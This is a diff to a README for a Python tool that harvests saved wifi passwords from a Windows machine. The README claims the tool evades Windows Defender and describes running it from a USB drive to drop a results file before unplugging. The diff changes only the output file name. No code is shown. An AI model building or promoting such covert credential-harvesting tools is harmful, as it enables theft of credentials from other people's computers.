@@ -3,5 +3,5 @@ A basic python script that scans and records wifi passwords on a windows compute
 As of now, it completely bypasses windows defender. 
 
 # Usage
-Best use case is to have it on a removavble drive, run the executable and wait about 5 to 10 seconds for a file named 'sysinfo' to be made in the same folder as the executable, then plug it out.
+Best use case is to have it on a removavble drive, run the executable and wait about 5 to 10 seconds for a file named 'sherrinford' to be made in the same folder as the executable, then plug it out.
 
